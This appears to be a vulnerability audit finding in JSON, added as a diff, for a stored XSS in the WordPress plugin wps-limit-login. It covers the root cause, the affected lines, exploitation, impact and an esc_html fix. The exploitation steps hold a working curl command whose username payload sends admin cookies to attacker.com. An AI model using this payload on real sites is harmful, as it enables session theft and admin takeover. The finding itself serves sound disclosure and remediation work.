@@ -1,0 +1,46 @@
+{
+  "finding_id": "WPS-LL-001",
+  "plugin_slug": "wps-limit-login",
+  "title": "Stored XSS via login username in admin lockout log and dashboard widget",
+  "severity": "medium",
+  "vulnerability_class": "xss",
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+  "cvss_score": 6.1,
+  "cwe": "CWE-79",
+  "auth_required": "none (to write payload); administrator (to trigger execution)",
+  "nonce_required": false,
+  "affected_files": [
+    "plugins/src/wps-limit-login/classes/plugin.php",
+    "plugins/src/wps-limit-login/blocks/log.php"
+  ],
+  "affected_lines": {
+    "store": "plugin.php:685-727 (notify_log), plugin.php:702 (username stored as array key)",
+    "output_log_tab": "blocks/log.php:75 (echo $user_info['username'] unescaped)",
+    "output_dashboard": "plugin.php:1421 (echo $user_info['username'] unescaped in dashboard widget)"
+  },
+  "entry_point": "WordPress wp_login_failed action hook — fired on any failed login attempt, no authentication required",
+  "root_cause": "In notify_log() (plugin.php:685), the raw $user_login value from the wp_login_failed hook is stored as an array key in the 'wps_limit_login_logged' option with no sanitization: `$log[$ip][$user_login]['counter']++`. The sorted_log_by_date() method (plugin.php:1244) reshapes this into `$new_log[date]['username'] = $user_name` where $user_name is the raw key. In blocks/log.php line 75, the username is echoed directly into HTML without escaping: `echo $user_info['username'] . ' (' . $user_info['counter'] . ' ' . _n(...) . ')'`. The same unescaped output occurs in the admin dashboard widget at plugin.php:1421. The note at log.php:80 shows esc_attr() IS applied in the data-username attribute of the unlock button, but the visible table cell content at line 75 has no escaping.",
+  "exploitation": {
+    "requirement": "No authentication required to plant the payload. Admin must view the Lockout Log tab (wp-admin/options-general.php?page=wps-limit-login&tab=log) or the WordPress dashboard.",
+    "steps": [
+      "1. Send a POST request to wp-login.php with an invalid password and username set to a JS payload:",
+      "   curl -X POST https://target.com/wp-login.php -d 'log=<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>&pwd=wrongpass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' -H 'Cookie: wordpress_test_cookie=WP+Cookie+check'",
+      "2. The login fails, wp_login_failed fires with the crafted username.",
+      "3. notify_log() is called, storing the raw username as an array key in the wps_limit_login_logged option in the database.",
+      "4. When any admin navigates to: wp-admin/options-general.php?page=wps-limit-login&tab=log",
+      "   OR loads the WordPress dashboard (which includes the WPS Limit Login widget),",
+      "   the unescaped username is echoed into the HTML page, executing the attacker's JavaScript in the admin's browser session.",
+      "5. Impact: session cookie theft, admin account takeover, arbitrary admin actions."
+    ],
+    "notes": "The payload is stored persistently in the WordPress options table. It will execute for every admin who views the log until it is manually cleared. The attack can be triggered repeatedly and from any IP. Note: WordPress login may require the test cookie; standard curl with cookie jar or browser-based submission works."
+  },
+  "impact": "An unauthenticated attacker can store arbitrary JavaScript that executes in the context of any administrator who views the WPS Limit Login log or the WordPress dashboard. This can be used to steal admin session cookies, perform administrative actions (create rogue admin accounts, install backdoors), or achieve persistent access to the WordPress installation.",
+  "false_positive_check": {
+    "is_page_admin_only": true,
+    "admin_only_mitigates": false,
+    "reasoning": "While the XSS fires only when an admin views the log, the payload is WRITTEN by an unauthenticated attacker. This is the classic stored XSS pattern: unauthenticated write + privileged read = meaningful vulnerability. An admin-only view page does not neutralize the threat when the attacker controls the stored content."
+  },
+  "remediation": {
+    "fix": "Escape the username before output in both locations:\n\n1. blocks/log.php line 75: Change\n   echo $user_info['username'] . ' ('\n   to:\n   echo esc_html($user_info['username']) . ' ('\n\n2. plugin.php line 1421 (dashboard widget): Change\n   ' - ' . $user_info['username'] . ' ('\n   to:\n   ' - ' . esc_html($user_info['username']) . ' ('\n\nOptionally, sanitize at storage time in notify_log() using sanitize_text_field($user_login) before using it as the array key, though note this would affect username lookups for the unlock feature."
+  }
+}
